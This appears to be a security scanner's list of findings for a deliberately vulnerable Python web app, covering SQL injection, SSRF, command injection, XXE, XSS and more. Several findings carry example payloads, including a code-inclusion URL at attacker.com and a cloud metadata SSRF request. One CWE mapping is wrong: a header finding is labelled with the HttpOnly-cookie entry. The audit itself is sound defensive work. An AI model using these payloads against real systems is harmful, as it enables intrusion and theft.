extra.message: SQL injection in the 'id' parameter at / route. User input from params['id'] is concatenated directly into SQL query via string addition: 'SELECT id, username, name, surname FROM users WHERE id=' + params['id']. An attacker can inject arbitrary SQL by manipulating the id parameter (e.g., ?id=1 UNION SELECT ...).

cwe: CWE-89: SQL Injection

extra.message: SQL injection in the 'comment' parameter INSERT at / route. User input from params['comment'] is interpolated into SQL via %-formatting: "INSERT INTO comments VALUES(NULL, '%s', '%s')" % (params['comment'], time.ctime()). An attacker can inject arbitrary SQL by including single quotes in the comment value.

cwe: CWE-89: SQL Injection

extra.message: SQL injection in the 'password' parameter at /login route. The password parameter is concatenated directly into SQL query: username=' + re.sub(r'[^\w]', '', ...) + ' AND password=' + params.get('password', '') + '. While the username is sanitized with a whitelist regex, the password has NO sanitization, allowing direct SQL injection via the password field.

cwe: CWE-89: SQL Injection

extra.message: Insecure deserialization via pickle.loads() on the 'object' parameter at / route. User-supplied input is passed directly to pickle.loads(), which can execute arbitrary Python code during deserialization. An attacker can craft a malicious pickle payload to achieve remote code execution.

cwe: CWE-502: Deserialization of Untrusted Data

extra.message: Path traversal via the 'path' parameter at / route. User input from params['path'] is passed to os.path.abspath() and then open() without any directory restriction check. An attacker can read arbitrary files on the server filesystem (e.g., ?path=/etc/passwd). os.path.abspath() only normalizes the path, it does not restrict it to a safe base directory.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: Server-Side Request Forgery (SSRF) via the 'path' parameter at / route. When '://' is present in params['path'], the value is passed directly to urllib.request.urlopen(), allowing the attacker to make arbitrary HTTP/S requests from the server, including to internal network resources (e.g., ?path=http://169.254.169.254/latest/meta-data/).

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: OS command injection via the 'domain' parameter at / route. User input is concatenated directly into a shell command string passed to subprocess.run() with shell=True: 'nslookup ' + params['domain']. An attacker can execute arbitrary system commands (e.g., ?domain=example.com;id).

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: Remote code execution via the 'include' parameter at / route. User-controlled input from params['include'] determines which file or URL is read, and the content is then passed to Python's exec() function. Combined with the path traversal/SSRF vulnerability, an attacker can cause arbitrary Python code to be executed (e.g., ?include=http://attacker.com/evil.py).

cwe: CWE-94: Improper Control of Generation of Code ('Code Injection')

extra.message: Reflected XSS via the 'v' parameter at / route. User input from params['v'] is injected directly into HTML content through a regex substitution without sanitization. An attacker can inject arbitrary HTML/JavaScript (e.g., ?v=).

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: Stored XSS via the 'comment' parameter at / route. First, user comment input is stored in SQLite without sanitization (line 50). Then on retrieval, comment values are rendered directly into HTML table cells via %s string formatting without any HTML escaping (line 54). Any visitor viewing comments will execute injected JavaScript. The 'if _ is None' check only prevents Python None from rendering, not HTML injection.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: Reflected XSS via JSONP callback parameter at /users.json. The 'callback' parameter value is injected directly into the response body as a function call wrapper: '%s(' % params['callback']. No sanitization is applied to the callback name. An attacker can inject arbitrary JavaScript (e.g., ?callback=alert(1)), enabling JSONP-based cross-site scripting.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: XPath injection via the 'name' parameter at / route. User input from params['name'] is interpolated directly into an XPath query string via %-formatting: ".//user[name/text()='%s']" % params['name']. An attacker can manipulate the XPath query to extract arbitrary XML data (e.g., by injecting a single quote to break out of the string).

cwe: CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')

extra.message: XML External Entity (XXE) injection via the 'xml' parameter at / route. The lxml XMLParser is configured with load_dtd=True, resolve_entities=True, and no_network=False. This enables DTD loading, entity resolution, and external network connections. An attacker can read local files, perform SSRF, or cause denial of service by submitting a crafted XML payload with external entities.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: Open redirect via the 'redir' parameter at / route. User input from params['redir'] is injected directly into a meta refresh tag: "content="0; url=%s"" % params['redir']. An attacker can redirect users to arbitrary external URLs (e.g., ?redir=http://evil.com), enabling phishing attacks.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: HTTP response header injection via the 'charset' parameter at / route. User input from params.get('charset', 'utf8') is injected into the Content-Type response header: '; charset=%s' % params.get('charset', 'utf8'). An attacker can inject CRLF sequences to perform HTTP response splitting or set arbitrary charsets to enable charset-based XSS attacks (e.g., charset=utf-7 for UTF-7 encoded script injection).

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')

extra.message:
Denial of Service via the 'size' parameter at / route. User-controlled integer from params['size'] is used to allocate a string of size n*n characters via nested list comprehension: "
".join('#' * int(params['size']) for _ in range(int(params['size'])). Supplying a large value (e.g., ?size=100000) causes an O(n^2) memory allocation, leading to memory exhaustion and denial of service. int() conversion does not prevent this since it accepts arbitrarily large values.

cwe: CWE-770: Allocation of Resources Without Limits or Throttling

extra.message: Sensitive information disclosure via Python traceback in error responses. When an unhandled exception occurs, traceback.format_exc() is called and its output is sent directly as the HTTP response body. This exposes internal file paths, source code snippets, variable values, and database schema details to the attacker.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: XSS protection explicitly disabled via the 'X-XSS-Protection: 0' response header. This disables the browser's built-in reflected XSS filter, making reflected XSS attacks easier to execute successfully. This is a security misconfiguration.

cwe: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
CWE-16: Configuration

extra.message: DOM-based XSS via the URL fragment (hash) in inline JavaScript. The client-side script reads document.location.hash and extracts a 'lang=' parameter value, then writes it to the page using document.write() with decodeURIComponent(). An attacker can inject arbitrary HTML/JavaScript via the URL fragment (e.g., #lang=<script>alert(1)</script>). Since document.write() does not HTML-escape, this results in DOM-based XSS.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
